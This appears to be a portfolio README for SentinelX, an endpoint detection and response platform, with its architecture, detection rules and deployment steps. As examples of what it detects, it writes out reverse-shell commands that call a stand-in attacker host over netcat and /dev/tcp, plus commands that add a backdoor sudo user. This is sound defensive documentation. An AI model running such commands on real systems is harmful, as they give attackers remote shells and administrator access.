<div align="center">

# 🛡️ SentinelX

### Enterprise Endpoint Detection & Response Platform

*Cloud-Native Security Monitoring • Threat Detection • SOC Operations • Security Orchestration*

<p>

<img src="https://img.shields.io/badge/Go-1.24-00ADD8?style=for-the-badge&logo=go&logoColor=white">

<img src="https://img.shields.io/badge/React-19-61DAFB?style=for-the-badge&logo=react&logoColor=black">

<img src="https://img.shields.io/badge/PostgreSQL-17-4169E1?style=for-the-badge&logo=postgresql&logoColor=white">

<img src="https://img.shields.io/badge/Redis-7-DC382D?style=for-the-badge&logo=redis&logoColor=white">

<img src="https://img.shields.io/badge/Docker-Enabled-2496ED?style=for-the-badge&logo=docker&logoColor=white">

</p>

---

### 🚨 Detect Threats Before They Become Incidents

SentinelX is an enterprise-grade Endpoint Detection & Response (EDR) and Security Operations Center (SOC) platform built from the ground up using Go, React, PostgreSQL and Redis.

The platform continuously monitors hosts, correlates security telemetry in real time, enriches events with threat intelligence feeds, and presents actionable detections through a modern SOC dashboard.

</div>

---

# ⚡ Key Capabilities

<table>
<tr>
<td width="50%">

### 🔥 Threat Detection

* Reverse Shell Detection
* SSH Brute Force Correlation
* Privilege Escalation Monitoring
* Persistence Detection
* Threat Intelligence Matching

</td>

<td width="50%">

### ☁️ Cloud Ready

* Dockerized Deployment
* Terraform Infrastructure
* PostgreSQL Persistence
* Redis Correlation Engine
* Horizontal Scaling Design

</td>
</tr>
</table>

---

# 🏗️ Architecture

```text
                    ┌─────────────────────────┐
                    │     Endpoint Fleet      │
                    │ Linux • Cloud • Servers │
                    └────────────┬────────────┘
                                 │
                                 ▼
                 ┌──────────────────────────┐
                 │    SentinelX Agent       │
                 │  Telemetry Collection    │
                 └────────────┬─────────────┘
                              │ HTTPS
                              ▼
                 ┌──────────────────────────┐
                 │     Go API Gateway       │
                 │   Event Ingestion Layer  │
                 └────────────┬─────────────┘
                              │
      ┌───────────────────────┼────────────────────────┐
      ▼                       ▼                        ▼

┌──────────────┐     ┌──────────────┐      ┌─────────────────┐
│ PostgreSQL   │     │ Redis Engine │      │ Detection Core  │
│ Host Assets  │     │ Sliding TTL  │      │ Rule Correlator │
│ Alert Store  │     │ Counters     │      │ Threat Intel    │
└──────────────┘     └──────────────┘      └─────────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │  SOC Dashboard  │
                    │ React + TS      │
                    └─────────────────┘
```

---

# 🎯 Detection Engine

## Reverse Shell Detection

```bash
nc attacker.com 4444 -e /bin/bash
bash -i >& /dev/tcp/x.x.x.x/4444
python -c 'import pty'
```

**Severity:** Critical

Detects common reverse shell execution techniques frequently observed during post-exploitation activities.

---

## SSH Brute Force Correlation

```text
Rule:
5 Failed Logins
Within 60 Seconds
Same Source IP
```

Powered by Redis sliding-window counters.

**Severity:** Medium

---

## Threat Intelligence Matching

Supported feeds:

* Feodo Tracker
* Emerging Threats
* Spamhaus

Example Detection:

```text
185.230.125.1
evil-botnet.ru
```

**Severity:** Critical

---

## Privilege Escalation Monitoring

```bash
useradd attacker
usermod -aG sudo attacker
```

Monitors suspicious administrative actions and credential file modifications.

---

# 📊 Security Dashboard

<img width="100%" src="docs/dashboard-overview.png">

### SOC Visibility

* Active Hosts
* Alert Timeline
* Threat Severity Breakdown
* Detection Trends
* Host Health Monitoring
* Security Event Correlation

---

# 🚀 Quick Start

## Docker Deployment

```bash
git clone https://github.com/YOUR_USERNAME/sentinelx.git

cd sentinelx/deploy

docker compose up -d --build
```

### Services

| Service    | URL                   |
| ---------- | --------------------- |
| Dashboard  | http://localhost:3000 |
| API        | http://localhost:8080 |
| PostgreSQL | localhost:5432        |
| Redis      | localhost:6379        |

---

# 📈 Engineering Highlights

### Backend

* Go
* Gin Framework
* GORM
* PostgreSQL
* Redis

### Frontend

* React
* TypeScript
* TailwindCSS
* Recharts

### Infrastructure

* Docker
* Docker Compose
* Terraform
* AWS ECS
* Azure VM

---

# 🔍 Example Security Alert

```json
{
  "host":"prod-web-01",
  "severity":"critical",
  "rule":"reverse_shell_detected",
  "process":"nc attacker.com 4444 -e /bin/bash",
  "timestamp":"2026-05-30T12:00:00Z"
}
```

---

# 📜 Development Timeline

| Commit  | Description               |
| ------- | ------------------------- |
| ebd5f9d | Go telemetry agent        |
| f03e4de | Backend API               |
| d838f33 | Redis correlation engine  |
| 3a2ac68 | Threat intelligence       |
| b629975 | Dashboard foundation      |
| 4447e95 | Metrics & host monitoring |
| fdbe70a | Alert timeline            |
| 68e4ea7 | Docker deployment         |

---

# 🎓 Skills Demonstrated

✔ Endpoint Detection & Response

✔ Security Monitoring

✔ Threat Intelligence

✔ SOC Operations

✔ Event Correlation

✔ Redis Stateful Detection

✔ Cloud Infrastructure

✔ Container Security

✔ Full Stack Development

✔ System Design

---

<div align="center">

### Built for Security Operations

**SentinelX — Detect. Correlate. Respond.**

</div>
